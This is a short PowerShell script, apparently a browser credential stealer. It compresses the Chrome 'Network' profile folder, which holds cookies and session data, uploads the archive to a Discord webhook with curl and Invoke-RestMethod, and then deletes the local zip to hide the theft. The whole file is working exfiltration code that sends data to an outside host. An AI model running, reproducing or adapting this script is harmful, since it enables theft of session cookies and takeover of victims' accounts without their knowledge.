# Set variables for the folder to be zipped and the destination ZIP file
$currentUser = $env:USERPROFILE
$sourceFolder = "$currentUser\AppData\Local\Google\Chrome\User Data\Default\Network"
$zipFileName = "NetworkData.zip"
$zipFilePath = "$env:TEMP\$zipFileName"

# Compress the folder to a zip file
Compress-Archive -Path $sourceFolder\* -DestinationPath $zipFilePath

# Function to upload the zip file to Discord
function Upload-Discord {
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))) {
        curl.exe -F "file=@$file" $hookurl
    }
}

# Upload the zip file to Discord
Upload-Discord -file $zipFilePath -text "Here is the zipped Network data."

# Clean up: Delete the zip file after upload
Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue
